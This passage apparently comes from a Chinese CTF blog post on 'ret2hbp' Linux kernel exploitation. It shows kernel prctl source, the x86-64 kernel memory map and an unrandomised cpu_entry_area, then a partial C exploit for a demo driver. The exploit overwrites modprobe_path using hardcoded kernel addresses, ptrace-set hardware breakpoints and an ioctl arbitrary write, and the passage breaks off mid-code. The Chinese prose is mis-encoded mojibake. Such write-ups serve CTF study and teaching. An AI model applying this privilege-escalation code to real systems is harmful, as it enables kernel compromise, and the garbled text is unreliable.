(!checkpoint_restore_ns_capable(current_user_ns()))<br><span class="hljs-keyword">return</span> -EPERM;<br><br>error = prctl_set_mm_exe_file(mm, prctl_map.exe_fd);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">return</span> error;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * arg_lock protects concurent updates but we still need mmap_lock for</span><br><span class="hljs-comment"> * read to exclude races with sys_brk.</span><br><span class="hljs-comment"> */</span><br>mmap_read_lock(mm);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We don&#x27;t validate if these members are pointing to</span><br><span class="hljs-comment"> * real present VMAs because application may have correspond</span><br><span class="hljs-comment"> * VMAs already unmapped and kernel uses these members for statistics</span><br><span class="hljs-comment"> * output in procfs mostly, except</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *  - @start_brk/@brk which are used in do_brk_flags but kernel lookups</span><br><span class="hljs-comment"> *    for VMAs when updating these memvers so anything wrong written</span><br><span class="hljs-comment"> *    here cause kernel to swear at userspace program but won&#x27;t lead</span><br><span class="hljs-comment"> *    to any problem in kernel itself</span><br><span class="hljs-comment"> */</span><br><br>spin_lock(&amp;mm-&gt;arg_lock);<br>mm-&gt;start_code= prctl_map.start_code;<br>mm-&gt;end_code= prctl_map.end_code;<br>mm-&gt;start_data= prctl_map.start_data;<br>mm-&gt;end_data= prctl_map.end_data;<br>mm-&gt;start_brk= prctl_map.start_brk;<br>mm-&gt;brk= prctl_map.brk;<br>mm-&gt;start_stack= prctl_map.start_stack;<br>mm-&gt;arg_start= prctl_map.arg_start;<br>mm-&gt;arg_end= prctl_map.arg_end;<br>mm-&gt;env_start= prctl_map.env_start;<br>mm-&gt;env_end= prctl_map.env_end;<br>spin_unlock(&amp;mm-&gt;arg_lock);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Note this update of @saved_auxv is lockless thus</span><br><span class="hljs-comment"> * if someone reads this member in procfs while we&#x27;re</span><br><span class="hljs-comment"> * updating -- it may get partly updated results. It&#x27;s</span><br><span class="hljs-comment"> * known and acceptable trade off: we leave it as is to</span><br><span class="hljs-comment"> * not introduce additional locks here making the kernel</span><br><span class="hljs-comment"> * more complex.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (prctl_map.auxv_size)<br><span class="hljs-built_in">memcpy</span>(mm-&gt;saved_auxv, user_auxv, <span class="hljs-keyword">sizeof</span>(user_auxv));<br><br>mmap_read_unlock(mm);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="HOWEVER"><a href="#HOWEVER" class="headerlink" title="HOWEVER"></a>HOWEVER</h2><p><code>ret2hbp</code>ä¹‹æ‰€ä»¥èƒ½å¤Ÿåˆ©ç”¨ï¼Œæ˜¯ç”±äº<code>cpu_entry_area</code>è¿™å—2Tçš„å†…å­˜å¹¶æ²¡æœ‰è¢«éšæœºåŒ–</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">========================================================================================================================<br>    Start addr    |<span class="hljs-string">   Offset   </span>|<span class="hljs-string">     End addr     </span>|<span class="hljs-string">  Size   </span>|<span class="hljs-string"> VM area description</span><br><span class="hljs-string">========================================================================================================================</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000000000000000 |<span class="hljs-string">    0       </span>|<span class="hljs-string"> 00007fffffffffff </span>|<span class="hljs-string">  128 TB </span>|<span class="hljs-string"> user-space virtual memory, different per mm</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> 0000800000000000 |<span class="hljs-string"> +128    TB </span>|<span class="hljs-string"> ffff7fffffffffff </span>|<span class="hljs-string"> ~16M TB </span>|<span class="hljs-string"> ... huge, almost 64 bits wide hole of non-canonical</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     virtual memory addresses up to the -128 TB</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string">     starting offset of kernel mappings.</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Kernel-space virtual memory, shared between all processes:</span><br><span class="hljs-string">____________________________________________________________</span>|___________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffff800000000000 |<span class="hljs-string"> -128    TB </span>|<span class="hljs-string"> ffff87ffffffffff </span>|<span class="hljs-string">    8 TB </span>|<span class="hljs-string"> ... guard hole, also reserved for hypervisor</span><br><span class="hljs-string"> ffff880000000000 </span>|<span class="hljs-string"> -120    TB </span>|<span class="hljs-string"> ffff887fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> LDT remap for PTI</span><br><span class="hljs-string"> ffff888000000000 </span>|<span class="hljs-string"> -119.5  TB </span>|<span class="hljs-string"> ffffc87fffffffff </span>|<span class="hljs-string">   64 TB </span>|<span class="hljs-string"> direct mapping of all physical memory (page_offset_base)</span><br><span class="hljs-string"> ffffc88000000000 </span>|<span class="hljs-string">  -55.5  TB </span>|<span class="hljs-string"> ffffc8ffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffc90000000000 </span>|<span class="hljs-string">  -55    TB </span>|<span class="hljs-string"> ffffe8ffffffffff </span>|<span class="hljs-string">   32 TB </span>|<span class="hljs-string"> vmalloc/ioremap space (vmalloc_base)</span><br><span class="hljs-string"> ffffe90000000000 </span>|<span class="hljs-string">  -23    TB </span>|<span class="hljs-string"> ffffe9ffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffea0000000000 </span>|<span class="hljs-string">  -22    TB </span>|<span class="hljs-string"> ffffeaffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> virtual memory map (vmemmap_base)</span><br><span class="hljs-string"> ffffeb0000000000 </span>|<span class="hljs-string">  -21    TB </span>|<span class="hljs-string"> ffffebffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffec0000000000 </span>|<span class="hljs-string">  -20    TB </span>|<span class="hljs-string"> fffffbffffffffff </span>|<span class="hljs-string">   16 TB </span>|<span class="hljs-string"> KASAN shadow memory</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|____________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Identical layout to the 56-bit one from here on:</span><br><span class="hljs-string">____________________________________________________________</span>|____________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> fffffc0000000000 |<span class="hljs-string">   -4    TB </span>|<span class="hljs-string"> fffffdffffffffff </span>|<span class="hljs-string">    2 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> vaddr_end for KASLR</span><br><span class="hljs-string"> fffffe0000000000 </span>|<span class="hljs-string">   -2    TB </span>|<span class="hljs-string"> fffffe7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> cpu_entry_area mapping</span><br><span class="hljs-string"> fffffe8000000000 </span>|<span class="hljs-string">   -1.5  TB </span>|<span class="hljs-string"> fffffeffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffff0000000000 </span>|<span class="hljs-string">   -1    TB </span>|<span class="hljs-string"> ffffff7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> %esp fixup stacks</span><br><span class="hljs-string"> ffffff8000000000 </span>|<span class="hljs-string"> -512    GB </span>|<span class="hljs-string"> ffffffeeffffffff </span>|<span class="hljs-string">  444 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffef00000000 </span>|<span class="hljs-string">  -68    GB </span>|<span class="hljs-string"> fffffffeffffffff </span>|<span class="hljs-string">   64 GB </span>|<span class="hljs-string"> EFI region mapping space</span><br><span class="hljs-string"> ffffffff00000000 </span>|<span class="hljs-string">   -4    GB </span>|<span class="hljs-string"> ffffffff7fffffff </span>|<span class="hljs-string">    2 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">   -2    GB </span>|<span class="hljs-string"> ffffffff9fffffff </span>|<span class="hljs-string">  512 MB </span>|<span class="hljs-string"> kernel text mapping, mapped to physical address 0</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">-2048    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffffffffa0000000 |<span class="hljs-string">-1536    MB </span>|<span class="hljs-string"> fffffffffeffffff </span>|<span class="hljs-string"> 1520 MB </span>|<span class="hljs-string"> module mapping space</span><br><span class="hljs-string"> ffffffffff000000 </span>|<span class="hljs-string">  -16    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br>    FIXADDR_START |<span class="hljs-string"> ~-11    MB </span>|<span class="hljs-string"> ffffffffff5fffff </span>|<span class="hljs-string"> ~0.5 MB </span>|<span class="hljs-string"> kernel-internal fixmap range, variable size and offset</span><br><span class="hljs-string"> ffffffffff600000 </span>|<span class="hljs-string">  -10    MB </span>|<span class="hljs-string"> ffffffffff600fff </span>|<span class="hljs-string">    4 kB </span>|<span class="hljs-string"> legacy vsyscall ABI</span><br><span class="hljs-string"> ffffffffffe00000 </span>|<span class="hljs-string">   -2    MB </span>|<span class="hljs-string"> ffffffffffffffff </span>|<span class="hljs-string">    2 MB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br><br></code></pre></td></tr></table></figure><p>butåœ¨6.2åŠåç»­ç‰ˆæœ¬ä¸­ï¼Œè¿™å—åŒºåŸŸä¹Ÿè¢«åŠ ä¸Šäº†ä¸€ä¸ªåç§»ï¼Œé€šè¿‡<code>get_cpu_entry_area</code>å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°è¿™ä¸€ç‚¹</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123711.png" style="zoom:50%;" /><h1 id="0x02ï¼šå¥½å¤šå¥½å¤šçš„ä¾‹é¢˜"><a href="#0x02ï¼šå¥½å¤šå¥½å¤šçš„ä¾‹é¢˜" class="headerlink" title="0x02ï¼šå¥½å¤šå¥½å¤šçš„ä¾‹é¢˜"></a>0x02ï¼šå¥½å¤šå¥½å¤šçš„ä¾‹é¢˜</h1><h2 id="demoä¾‹é¢˜"><a href="#demoä¾‹é¢˜" class="headerlink" title="demoä¾‹é¢˜"></a>demoä¾‹é¢˜</h2><ul><li><a href="https://github.com/veritas501/hbp_attack_demo">https://github.com/veritas501/hbp_attack_demo</a></li></ul><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202155116.png" style="zoom:50%;" /><p>ååˆ†ç™½ç»™çš„æ— é™æ¬¡æ•°ä»»æ„åœ°å€å†™8å­—èŠ‚</p><p>ç›´æ¥æŒ‰ç…§ä¸Šé¢åˆ†æçš„æ€è·¯å†™å³å¯ï¼Œæ³„éœ²kaslrä¹‹åç”¨modprobeå®Œæˆåˆ©ç”¨</p><h3 id="FINAL-EXP-modprobeè§£æ³•"><a href="#FINAL-EXP-modprobeè§£æ³•" class="headerlink" title="FINAL EXP   modprobeè§£æ³•"></a>FINAL EXP   modprobeè§£æ³•</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ENTRY_AREA_DB_STACK_RCX_ADDR 0xfffffe0000010fb0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_ADDR 0x1234000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_SIZE 0x2000</span><br><br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">size_t</span> modprobe_path = <span class="hljs-number">0xffffffff82e8b920</span>;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">pid_t</span> hbp_pid;<br><span class="hljs-type">char</span> * mmap_addr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint64_t</span> vul;<br>&#125;vuln;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> vul)</span><br>&#123;<br>    vuln note;<br>    note.addr = addr;<br>    note.vul = vul;<br>    ioctl(dev_fd ,<span class="hljs-number">0</span> , &amp; note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_rcx</span><span 